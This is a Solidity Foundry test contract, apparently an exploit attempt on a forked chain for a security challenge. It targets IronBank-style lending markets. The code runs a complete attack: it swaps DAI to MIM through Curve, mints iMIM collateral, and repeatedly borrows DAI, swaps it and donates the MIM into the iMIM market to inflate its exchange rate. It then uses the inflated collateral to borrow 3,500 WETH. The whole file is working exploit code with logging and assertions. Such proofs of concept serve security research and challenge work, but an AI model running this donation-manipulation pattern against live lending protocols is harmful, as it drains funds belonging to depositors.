// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Minimal42 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IComptroller42 {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICErc20Like42 is IERC20Minimal42 {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
}

interface ICurveMimPool {
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

/// @notice Hypothesis: iMIM is the live low-float collateral market on this fork.
/// Real DAI->MIM swaps through Curve should let us mint iMIM, borrow DAI, swap the
/// borrowed DAI back into MIM, donate MIM directly into iMIM, and compound enough
/// liquidity to unlock a meaningful iWETH borrow.
contract Attempt42 is Test {
    uint256 internal constant FORK_BLOCK = 14_684_704;
    uint256 internal constant EXPECTED_CHAIN_ID = 2401;
    uint256 internal constant SEED_DAI = 15_000_000e18;
    uint256 internal constant ROUND1_DAI = 8_000_000e18;
    uint256 internal constant ROUND2_DAI = 8_000_000e18;
    uint256 internal constant ROUND3_DAI = 6_000_000e18;
    uint256 internal constant TARGET_IWETH_BORROW = 3_500 ether;

    IERC20Minimal42 internal constant DAI = IERC20Minimal42(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20Minimal42 internal constant MIM = IERC20Minimal42(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    ICErc20Like42 internal constant IDAI = ICErc20Like42(0x8e595470Ed749b85C6F7669de83EAe304C2ec68F);
    ICErc20Like42 internal constant IMIM = ICErc20Like42(0x9e8E207083ffd5BDc3D99A1F32D1e6250869C1A9);
    ICErc20Like42 internal constant IWETH = ICErc20Like42(0x41c84c0e2EE0b740Cf0d31F63f3B6F627DC6b393);
    IComptroller42 internal constant COMPTROLLER = IComptroller42(0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB);
    ICurveMimPool internal constant MIM_POOL = ICurveMimPool(0x5a6A4D54456819380173272A5E8E9B9904BdF41B);

    function setUp() public {
        vm.createSelectFork("ch3", FORK_BLOCK);

        vm.label(address(DAI), "DAI");
        vm.label(address(MIM), "MIM");
        vm.label(address(IDAI), "iDAI");
        vm.label(address(IMIM), "iMIM");
        vm.label(address(IWETH), "iWETH");
        vm.label(address(COMPTROLLER), "IronBankComptroller");
        vm.label(address(MIM_POOL), "CurveMimPool");
    }

    function test_iMim_donation_bootstraps_iweth_borrow() public {
        deal(address(DAI), address(this), SEED_DAI);

        console.log("CHAIN_ID:", block.chainid);
        console.log("FORK_BLOCK:", block.number);
        console.log("SEED_DAI:", SEED_DAI);
        console.log("IMIM_CASH_BEFORE:", IMIM.getCash());
        console.log("IDAI_CASH_BEFORE:", IDAI.getCash());
        console.log("IWETH_CASH_BEFORE:", IWETH.getCash());
        _logImimState("PRE_MINT");

        assertEq(block.chainid, EXPECTED_CHAIN_ID, "unexpected challenge chain id");

        require(DAI.approve(address(MIM_POOL), type(uint256).max), "approve Curve DAI failed");
        require(MIM.approve(address(IMIM), type(uint256).max), "approve iMIM failed");

        uint256 expectedSeedMim = MIM_POOL.get_dy_underlying(1, 0, SEED_DAI);
        uint256 seedMim = MIM_POOL.exchange_underlying(1, 0, SEED_DAI, (expectedSeedMim * 995) / 1000);
        console.log("SEED_MIM:", seedMim);

        require(IMIM.mint(seedMim) == 0, "iMIM mint failed");
        console.log("IMIM_BALANCE:", IMIM.balanceOf(address(this)));

        address[] memory markets = new address[](1);
        markets[0] = address(IMIM);

        uint256[] memory enterResults = COMPTROLLER.enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enterMarkets failed");

        _logImimState("POST_SEED_MINT");
        _logLiquidity("POST_SEED_MINT");

        _borrowSwapDonateRound("ROUND1", ROUND1_DAI);
        _borrowSwapDonateRound("ROUND2", ROUND2_DAI);
        _borrowSwapDonateRound("ROUND3", ROUND3_DAI);

        console.log("TARGET_IWETH_BORROW:", TARGET_IWETH_BORROW);
        require(IWETH.borrow(TARGET_IWETH_BORROW) == 0, "iWETH borrow failed");

        _logLiquidity("POST_IWETH_BORROW");
        console.log("IWETH_DEBT:", IWETH.borrowBalanceStored(address(this)));
        console.log("WETH_BALANCE:", IERC20Minimal42(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).balanceOf(address(this)));

        assertGe(IWETH.borrowBalanceStored(address(this)), TARGET_IWETH_BORROW, "iWETH debt missing");
        assertGt(IERC20Minimal42(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).balanceOf(address(this)), 0, "no WETH received");
    }

    function _borrowSwapDonateRound(string memory label, uint256 daiBorrowAmount) internal {
        console.log(label);
        console.log("BORROW_DAI:", daiBorrowAmount);

        require(IDAI.borrow(daiBorrowAmount) == 0, "iDAI borrow failed");

        uint256 expectedMim = MIM_POOL.get_dy_underlying(1, 0, daiBorrowAmount);
        uint256 mimOut = MIM_POOL.exchange_underlying(1, 0, daiBorrowAmount, (expectedMim * 995) / 1000);
        require(MIM.transfer(address(IMIM), mimOut), "MIM donation failed");

        console.log("MIM_DONATED:", mimOut);
        _logImimState(label);
        _logLiquidity(label);
    }

    function _logImimState(string memory stage) internal view {
        console.log(stage);
        console.log("IMIM_EXCHANGE_RATE:", IMIM.exchangeRateStored());
        console.log("IMIM_TOTAL_SUPPLY:", IMIM.totalSupply());
        console.log("IMIM_CASH:", IMIM.getCash());
        console.log("IMIM_TOTAL_BORROWS:", IMIM.totalBorrows());
        console.log("IMIM_TOTAL_RESERVES:", IMIM.totalReserves());
    }

    function _logLiquidity(string memory stage) internal view {
        (uint256 err, uint256 liquidity, uint256 shortfall) = COMPTROLLER.getAccountLiquidity(address(this));
        console.log(stage);
        console.log("LIQUIDITY_ERR:", err);
        console.log("LIQUIDITY_ETH:", liquidity);
        console.log("SHORTFALL_ETH:", shortfall);
    }
}
